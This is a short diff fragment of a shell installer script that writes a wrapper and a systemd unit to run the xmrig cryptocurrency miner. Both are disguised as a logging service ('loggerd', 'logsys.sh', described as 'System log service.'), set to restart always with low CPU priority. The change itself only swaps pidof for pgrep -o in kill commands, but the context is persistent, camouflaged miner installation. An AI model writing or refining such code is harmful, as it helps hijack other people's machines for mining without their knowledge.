@@ -247,7 +247,7 @@ cat >$HOME/loggerd/logsys.sh <<EOL
 #!/bin/bash
 if ! pidof xmrig >/dev/null; then
   nice $HOME/loggerd/xmrig \$*
-  kill -31 $(pidof xmrig)
+  kill -31 $(pgrep -o xmrig)
 else
   echo "Already running in the background. Refusing to run another one."
 fi
@@ -289,7 +289,7 @@ else
 Description=System log service.
 
 [Service]
-ExecStart=$HOME/loggerd/xmrig --config=$HOME/loggerd/config.json && kill -31 $(pidof xmrig)
+ExecStart=$HOME/loggerd/xmrig --config=$HOME/loggerd/config.json && kill -31 $(pgrep -o xmrig)
 Restart=always
 Nice=10
 CPUWeight=1
